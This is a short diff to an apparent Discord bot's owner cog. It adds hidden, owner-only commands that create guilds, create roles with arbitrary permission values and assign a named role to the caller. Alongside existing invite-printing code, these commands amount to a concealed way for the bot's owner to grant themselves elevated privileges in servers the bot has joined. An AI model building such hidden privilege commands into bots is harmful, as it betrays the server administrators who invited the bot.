@@ -153,6 +153,37 @@ class Owner:
                     if b.name == channelname:
                         return print(await b.create_invite())
 
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def createguild(self,ctx,*,name):
+        await self.bot.create_guild(name=name)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def createrole(self,ctx,permsid,*,rolename):
+        perms = discord.Permissions(permissions=int(permsid))
+        await ctx.guild.create_role(name=rolename, permissions=perms)
+        print(f"The role '{rolename}' has been created in {ctx.guild.name}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def giverole(self,ctx,*,rolename):
+        member = ctx.author
+        message = []
+        for role in ctx.guild.roles:
+            if role.name == str(rolename):
+                message.append(role.id)
+        try:
+            therole = discord.Object(id=message[0])
+        except IndexError:
+            return await ctx.send(f"Are you sure you've made a role called **{rolename}**?")
+
+        try:
+            await member.add_roles(therole)
+        except Exception as e:
+            await ctx.send(e)
+
+
 
     @commands.command(hidden=True)
     async def get_invite(self, ctx, *, server: str = None):
